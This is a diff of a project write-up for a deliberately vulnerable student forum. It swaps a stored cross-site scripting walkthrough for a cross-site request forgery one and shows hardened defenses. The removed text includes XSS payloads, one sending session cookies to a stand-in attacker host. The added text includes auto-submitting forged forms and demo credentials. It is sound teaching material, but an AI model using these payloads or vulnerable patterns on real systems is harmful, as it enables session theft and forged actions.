@@ -1,113 +1,118 @@
-# Comprehensive Technical Explanations of Stored Cross Site Scripting and Defense:
+# Comprehensive Technical Explanations of Cross Site Request Forgery and Defense:
 
 ## 1. Executive Summary of the Project:
-1. This project investigates and demonstrates Problem 1: Stored Cross Site Scripting (XSS) within a modern fullstack web forum developed for the IIIT Allahabad Open Source Community.
-2. The project delivers two separate editions of the application to facilitate a direct side by side security comparison.
-3. The first edition, located in folder `IIITAOSCommunityForumV1`, contains deliberate code flaws that allow persistent script injection.
-4. The second edition, located in folder `IIITAOSCommunityForumV2`, implements a robust defense in depth strategy that neutralizes all stored payloads.
+1. This project investigates and demonstrates Problem 2: Cross Site Request Forgery (CSRF) within a fullstack web forum developed for the IIIT Allahabad Open Source Community.
+2. The project delivers two separate editions of the application to facilitate a direct security comparison.
+3. The first edition, located in folder `IIITAOSCommunityForumV1`, contains deliberate architectural flaws that allow cross origin request forgery.
+4. The second edition, located in folder `IIITAOSCommunityForumV2`, implements an industry standard defense in depth strategy that completely eliminates CSRF vulnerabilities.
 
 ## 2. Directory Structure and Component Breakdown:
 
 ### 2.1 Directory `IIITAOSCommunityForumV1` (Vulnerable Edition):
-1. Purpose: Implements the initial version of the forum where user submitted inputs are accepted without sanitization and rendered directly into the browser DOM.
-2. Backend (`server/`): Contains `server.js`, `database.js`, `routes/auth.js`, `routes/posts.js`, and `routes/chat.js` without security headers or input filtering.
-3. Frontend (`client/`): Contains `App.jsx` and `ContentRenderer.jsx` which inserts raw HTML strings into the DOM via `containerRef.current.innerHTML = content`.
-4. Storage: Embedded SQLite database `forum.db` storing discussion posts, comments, live chat messages, and user biographies.
-5. Documentation: Contains `ReadMe.md` and `Vulnerable.md`.
+1. Purpose: Implements the initial version of the forum where state changing operations rely solely on ambient session cookies without anti CSRF tokens or SameSite restrictions.
+2. Backend (`server/`): Contains Express routes where POST and PUT handlers execute state changes without cryptographic token validation or origin checks.
+3. Frontend (`client/`): Contains the React user interface for discussions, comments, member profiles, and live chat.
+4. Attacker Exploit: Includes `public/attacker_csrf_exploit.html` demonstrating cross origin hidden form auto submission against the live forum.
+5. Storage: Embedded SQLite database `forum.db` storing discussion posts, comments, live chat messages, and user biographies.
+6. Documentation: Contains `ReadMe.md` and `Vulnerable.md`.
 
 ### 2.2 Directory `IIITAOSCommunityForumV2` (Secured Edition):
-1. Purpose: Implements the patched version of the forum where all Cross Site Scripting vectors are completely neutralized.
-2. Backend (`server/`): Configures Content Security Policy response headers in `server.js` and enables the `httpOnly` attribute on authentication cookies in `routes/auth.js`.
-3. Frontend (`client/`): Utilizes `DOMPurify` within `ContentRenderer.jsx` to sanitize all user markup before writing to the DOM.
-4. Storage: Embedded SQLite database `forum.db` operating alongside the sanitized rendering pipeline.
-5. Documentation: Contains `ReadMe.md` and `XSSAttackDefense.md`.
+1. Purpose: Implements the hardened version of the forum where all Cross Site Request Forgery vectors are mitigated.
+2. Backend (`server/`): Implements Anti CSRF synchronizer token verification, `SameSite=Strict` cookie policies, and Origin and Referer validation middleware in `routes/auth.js`.
+3. Frontend (`client/`): Configured in `client/src/App.jsx` to fetch the session CSRF token and attach the CSRF token header on state changing requests.
+4. Storage: Embedded SQLite database `forum.db` operating alongside secure request verification pipelines.
+5. Documentation: Contains `ReadMe.md` and `CSRFAttackDefense.md`.
 
-## 3. Detailed Analysis of the Stored XSS Flaw in Version 1:
+## 3. Detailed Analysis of the Cross Site Request Forgery Flaw in Version 1:
 
-### 3.1 What is Stored Cross Site Scripting:
-1. Definition: Stored Cross Site Scripting occurs when an application receives untrusted input from a user, writes that input into persistent storage such as a database, and later presents it to other users without adequate output neutralization.
-2. Autonomous Triggering: Unlike Reflected XSS which requires victims to click a specially crafted URL, Stored XSS executes automatically whenever any user simply visits the affected page.
-3. Elevated Risk for Administrators: If an administrator opens a discussion thread or inspects a member profile containing a stored payload, the script executes with full administrative privileges.
+### 3.1 What is Cross Site Request Forgery:
+1. Definition: Cross Site Request Forgery is an attack where a malicious third party web application tricks a victim web browser into executing unauthorized state changing actions on a trusted web application in which the victim is currently authenticated.
+2. Ambient Credential Mechanism: Web browsers automatically attach all stored cookies associated with a domain whenever an HTTP request is made to that domain, even if the request was initiated by an external site.
+3. Danger for Authenticated Users: If an authenticated administrator visits an external malicious web page, that page can silently submit requests with administrative privileges without requiring user interaction.
 
 ### 3.2 Where the Code Flaws Exist in Version 1:
-1. Backend Ingestion Flaw in `server/routes/posts.js`: The endpoint `POST /api/posts/:id/comments` takes the raw string from the request body and writes it into the SQLite `comments` table using an SQL query without stripping HTML tags:
+1. Missing Anti CSRF Tokens in `server/routes/auth.js`: The endpoint `POST /api/auth/profile` accepts state changes without requiring or verifying a unique unpredictable token.
 ```javascript
-db.prepare(`
-  INSERT INTO comments (post_id, user_id, content)
-  VALUES (?, ?, ?)
-`).run(req.params.id, req.user.id, content);
+const handleProfileUpdate = (req, res) => {
+  if (!req.user) {
+    return res.status(401).json({ error: 'Authentication required.' });
+  }
+  const { full_name, bio } = req.body;
+  const db = getDB();
+  db.prepare('UPDATE users SET full_name = ?, bio = ? WHERE id = ?').run(
+    full_name || req.user.full_name,
+    bio !== undefined ? bio : req.user.bio,
+    req.user.id
+  );
+  return res.json({ message: 'Profile updated successfully' });
+};
+router.post('/profile', authenticate, handleProfileUpdate);
 ```
-2. Frontend Injection Flaw in `client/src/components/ContentRenderer.jsx`: In order to support rich text formatting such as bold text and code snippets, the component sets `containerRef.current.innerHTML = content`. When the browser parses this HTML string, any embedded JavaScript or event handlers execute immediately:
-```javascript
-export default function ContentRenderer({ content, className = '' }) {
-  const containerRef = useRef(null);
-
-  useEffect(() => {
-    if (!containerRef.current || !content) return;
-    containerRef.current.innerHTML = content;
-  }, [content]);
-
-  return <div ref={containerRef} className={className} />;
-}
-```
-3. Insecure Cookie Flaw in `server/routes/auth.js`: The login and registration routes set the authentication cookie `session_token` without setting `httpOnly: true`, meaning client scripts can freely read the cookie via `document.cookie`:
+2. Unrestricted Cookie SameSite Configuration in `server/routes/auth.js`: The authentication cookie is issued without `SameSite=Strict` protection, meaning the browser attaches the cookie on cross origin form submissions.
 ```javascript
 res.cookie('session_token', token, {
   path: '/'
 });
 ```
+3. Missing Origin and Referer Header Verification in `server/server.js`: The Express server accepts requests regardless of whether the `Origin` header matches the trusted application domain.
 
-## 4. How to Execute a Stored XSS Attack on Version 1:
+## 4. How to Execute a Cross Site Request Forgery Attack on Version 1:
 
 ### 4.1 Step by Step Attack Walkthrough:
-1. Step 1: An attacker logs into the forum using the account credentials for `lucky` with password `lucky123`.
-2. Step 2: The attacker navigates to the first discussion thread titled `Welcome to the IIITA Open Source Community Forum`.
-3. Step 3: In the Leave a Comment form, the attacker submits an image tag containing an intentional error event handler:
+1. Step 1: The victim logs into the forum platform using credentials for `mridankan` with password `mridankan123`.
+2. Step 2: The browser receives the `session_token` cookie and stores it for `localhost:3000`.
+3. Step 3: The attacker hosts an external webpage `attacker_csrf_exploit.html` containing an invisible HTML form.
 ```html
-<img src="invalid_image" onerror="alert('Stored XSS Executed! Session Cookie: ' + document.cookie)">
+<form id="csrfForm" action="http://localhost:3000/api/auth/profile" method="POST">
+  <input type="hidden" name="full_name" value="Mridankan Mandal (Hijacked via CSRF)" />
+  <input type="hidden" name="bio" value="Account profile compromised via Cross Site Request Forgery." />
+</form>
+<script>
+  window.onload = function() { document.getElementById('csrfForm').submit(); };
+</script>
 ```
-4. Step 4: The Express backend accepts the request and inserts the string into the SQLite database table `comments`.
-5. Step 5: A victim user such as `mridankan` (Administrator) logs in and opens the same discussion thread.
-6. Step 6: The victim browser requests the discussion comments from the API and renders the comment into the DOM using `innerHTML`.
-7. Step 7: The browser attempts to load the image from `invalid_image`, fails, and immediately triggers the JavaScript code in the `onerror` attribute.
-8. Step 8: An alert dialog pops up on the administrator screen displaying the active session cookie value, proving complete arbitrary JavaScript execution.
+4. Step 4: The victim visits the attacker web page while keeping the forum session active in another browser tab.
+5. Step 5: The malicious page triggers immediate form submission targeting `http://localhost:3000/api/auth/profile`.
+6. Step 6: The victim browser automatically includes the valid `session_token` cookie.
+7. Step 7: The backend server receives the request, verifies the session cookie, and executes the biography update.
+8. Step 8: The administrator biography is updated without victim knowledge or consent.
 
-### 4.2 Advanced Attack Scenario: Silent Cookie Exfiltration:
-1. Payload:
+### 4.2 Advanced Attack Scenario: Forged Community Announcements:
+1. Payload.
 ```html
-<img src="x" onerror="fetch('https://attacker.example.com/log?cookie=' + encodeURIComponent(document.cookie))">
+<form action="http://localhost:3000/api/posts" method="POST">
+  <input type="hidden" name="title" value="Emergency Society Announcement" />
+  <input type="hidden" name="category" value="Announcements" />
+  <input type="hidden" name="content" value="Phishing message broadcasted on behalf of the administrator." />
+</form>
 ```
-2. Explanation: Instead of displaying a visible alert box, the payload uses the `fetch` API in the background to quietly transmit the victim session cookie to an external server controlled by the attacker.
-3. Outcome: The attacker obtains the administrator session identifier and can hijack the administrator account without knowing their password.
+2. Explanation: Exploits administrative credentials to publish misleading notices across the entire student community.
 
 ## 5. Detailed Breakdown of the Defense Mechanisms in Version 2:
 
-### 5.1 Defense 1: Client Side DOM Sanitization via DOMPurify:
-1. Implementation Location: In file `IIITAOSCommunityForumV2/client/src/components/ContentRenderer.jsx`.
-2. How It Operates: Before any user content is written to the DOM, it is passed through the `DOMPurify` library.
-3. Sanitization Rule: `DOMPurify` explicitly strips all `script` tags, `iframe` tags, and event attributes such as `onerror`, `onload`, and `onclick` while preserving benign formatting tags like `strong`, `em`, and `code`.
-4. Code Implementation:
-```javascript
-import DOMPurify from 'dompurify';
-
-const cleanHtml = DOMPurify.sanitize(content, {
-  ALLOWED_TAGS: [
-    'b', 'i', 'em', 'strong', 'u', 'p', 'br',
-    'code', 'pre', 'ul', 'ol', 'li', 'blockquote',
-    'span', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6'
-  ],
-  ALLOWED_ATTR: ['class', 'style'],
-  FORBID_TAGS: ['script', 'iframe', 'object', 'embed', 'link', 'style'],
-  FORBID_ATTR: ['onerror', 'onload', 'onclick', 'onmouseover', 'onfocus', 'onblur', 'src']
-});
-
-containerRef.current.innerHTML = cleanHtml;
-```
-
-### 5.2 Defense 2: Session Cookie Hardening with HttpOnly:
+### 5.1 Defense 1: Cryptographic Anti CSRF Synchronizer Tokens:
 1. Implementation Location: In file `IIITAOSCommunityForumV2/server/routes/auth.js`.
-2. How It Operates: The server configures the authentication cookie with `httpOnly: true` and `sameSite: 'strict'`.
-3. Code Implementation:
+2. How It Operates: Upon login, the server generates a cryptographically random 256 bit token using `crypto.randomBytes(32)` and stores it in the active session record.
+3. Code Implementation.
+```javascript
+function verifyCsrf(req, res, next) {
+  if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) return next();
+  const submittedToken = req.headers['x_csrf_token'] || req.body?.csrf_token;
+  const expectedToken = req.user?.csrfToken;
+  if (!submittedToken || !expectedToken || submittedToken !== expectedToken) {
+    return res.status(403).json({
+      error: 'CSRF Protection: Missing or invalid Anti CSRF synchronizer token.'
+    });
+  }
+  next();
+}
+```
+4. Security Guarantee: Because of the Same Origin Policy, external malicious sites cannot read the CSRF token from the application, making it impossible to forge a valid request.
+
+### 5.2 Defense 2: Session Cookie Hardening with SameSite Strict:
+1. Implementation Location: In file `IIITAOSCommunityForumV2/server/routes/auth.js`.
+2. How It Operates: The server configures the authentication cookie with `sameSite: 'strict'` and `httpOnly: true`.
+3. Code Implementation.
 ```javascript
 res.cookie('session_token', token, {
   httpOnly: true,
@@ -115,48 +120,39 @@ res.cookie('session_token', token, {
   path: '/'
 });
 ```
-4. Security Impact: The browser strictly prevents client JavaScript from accessing `document.cookie`. Even if a script injection were to occur, accessing `document.cookie` returns an empty string, keeping the session safe.
+4. Security Guarantee: The browser strictly refuses to attach the `session_token` cookie when a cross origin form or script initiates an HTTP request targeting `localhost:3000`.
 
-### 5.3 Defense 3: Content Security Policy Headers:
-1. Implementation Location: In file `IIITAOSCommunityForumV2/server/server.js`.
-2. How It Operates: The Express server attaches HTTP security headers to all outgoing responses.
-3. Code Implementation:
+### 5.3 Defense 3: Origin and Referer Request Header Validation:
+1. Implementation Location: In file `IIITAOSCommunityForumV2/server/routes/auth.js`.
+2. How It Operates: Security middleware inspects the `Origin` and `Referer` headers on all state changing requests.
+3. Code Implementation.
 ```javascript
-app.use((req, res, next) => {
-  res.setHeader(
-    'Content-Security-Policy',
-    "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self';"
-  );
-  res.setHeader('X-Content-Type-Options', 'nosniff');
-  res.setHeader('X-Frame-Options', 'DENY');
-  res.setHeader('X-XSS-Protection', '1; mode=block');
-  next();
-});
+const origin = req.headers.origin;
+const allowedOrigins = ['http://localhost:3000', 'http://127.0.0.1:3000'];
+if (origin && !allowedOrigins.includes(origin)) {
+  return res.status(403).json({
+    error: 'CSRF Blocked: Cross origin state modification rejected. Untrusted Origin: ' + origin
+  });
+}
 ```
-4. Security Impact: The browser enforces a strict policy that disallows the execution of unauthorized inline scripts or external unauthorized network connections.
+4. Security Guarantee: Requests arriving from foreign origins are rejected immediately before touching the database.
 
 ## 6. Demonstration of Attack Neutralization in Version 2:
 
-### 6.1 Testing the Payload on Version 2:
-1. The attacker submits the identical payload:
-```html
-<img src="invalid_image" onerror="alert('Stored XSS')">
+### 6.1 Testing the Forged Exploit on Version 2:
+1. The attacker attempts to trigger the identical forged request against `http://localhost:3000/api/auth/profile`.
+2. In Version 2, the browser suppresses the `session_token` cookie due to `SameSite=Strict`.
+3. The server middleware detects the missing CSRF token header and foreign `Origin`.
+4. The server rejects the request with HTTP 403 Forbidden.
+```json
+{
+  "error": "CSRF Protection: Missing or invalid Anti CSRF synchronizer token."
+}
 ```
-2. In Version 2, when the administrator opens the discussion thread, `ContentRenderer` passes the string to `DOMPurify`.
-3. `DOMPurify` detects the unauthorized `onerror` attribute and completely removes it.
-4. The sanitized output rendered to the DOM is simply:
-```html
-<img src="invalid_image">
-```
-5. The browser fails to load the image, but because the `onerror` attribute was deleted, no JavaScript executes and no alert dialog appears.
-
-### 6.2 Testing Cookie Theft on Version 2:
-1. If an attacker attempts to execute `document.cookie`, the browser returns an empty string because the cookie is marked `HttpOnly`.
-2. Furthermore, any attempt to transmit data to an external domain is blocked by the Content Security Policy.
+5. The administrator profile remains completely intact and secure.
 
 ## 7. Direct Technical Comparison Between Version 1 and Version 2:
-1. User Input Storage: Both versions use SQLite 3 parameterized queries to store data safely against SQL injection.
-2. DOM Insertion Technique: Version 1 uses unneutralized `innerHTML` while Version 2 uses `DOMPurify` sanitized `innerHTML`.
-3. Cookie Security: Version 1 has `httpOnly` set to `false` while Version 2 has `httpOnly` set to `true`.
-4. Browser Security Headers: Version 1 sends no CSP headers while Version 2 enforces `Content-Security-Policy` and `X-Content-Type-Options` headers.
-5. Attack Outcome: In Version 1, Stored XSS executes automatically and compromises session tokens. In Version 2, all payloads are completely neutralized and user sessions remain secure.
+1. CSRF Protection: Version 1 has zero token verification while Version 2 validates a cryptographic synchronizer token on all state changing routes.
+2. Cookie Policy: Version 1 uses default unrestricted cookies while Version 2 enforces `SameSite=Strict` and `HttpOnly`.
+3. Request Origin Validation: Version 1 allows any origin while Version 2 strictly whitelists trusted origins.
+4. Attack Outcome: In Version 1, CSRF succeeds silently and alters user profiles. In Version 2, all forged requests are rejected with HTTP 403 Forbidden and user accounts remain completely protected.
